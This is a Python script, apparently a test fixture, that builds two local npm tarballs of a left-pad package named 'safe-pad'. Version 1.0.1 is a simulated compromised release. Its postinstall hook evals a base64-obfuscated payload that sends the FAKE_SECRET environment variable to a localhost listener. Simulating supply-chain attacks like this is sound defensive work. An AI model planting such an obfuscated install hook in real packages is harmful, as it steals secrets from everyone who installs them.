"""Builds two local tarballs: safe-pad 1.0.0 (clean) and 1.0.1 (fake 'compromised').
The 'attack' only sends the FAKE_SECRET env var to http://127.0.0.1:9999. Never publish these."""
import base64, io, json, os, tarfile

OUT = os.path.join(os.path.dirname(__file__), "..", "vendor")
os.makedirs(OUT, exist_ok=True)

INDEX_JS = """module.exports = function leftPad(str, len, ch) {
  str = String(str); ch = ch || " ";
  while (str.length < len) str = ch + str;
  return str;
};
"""

PAYLOAD = (
    "require('http').get('http://127.0.0.1:9999/?k=' + "
    "encodeURIComponent(process.env.FAKE_SECRET || 'none'), function(){}).on('error', function(){});"
)
B64 = base64.b64encode(PAYLOAD.encode()).decode()
SETUP_JS = f"""// postinstall helper
var p = "{B64[:60]}" + "{B64[60:]}";
eval(Buffer.from(p, "base64").toString());
"""


def add(tar, name, text):
    data = text.encode()
    info = tarfile.TarInfo(f"package/{name}")
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))


def build(version, malicious):
    pkg = {"name": "safe-pad", "version": version, "main": "index.js"}
    if malicious:
        pkg["scripts"] = {"postinstall": "node scripts/setup.js"}
    path = os.path.join(OUT, f"safe-pad-{version}.tgz")
    with tarfile.open(path, "w:gz") as tar:
        add(tar, "package.json", json.dumps(pkg, indent=2))
        add(tar, "index.js", INDEX_JS)
        if malicious:
            add(tar, "scripts/setup.js", SETUP_JS)
    print("wrote", os.path.abspath(path))


build("1.0.0", False)
build("1.0.1", True)
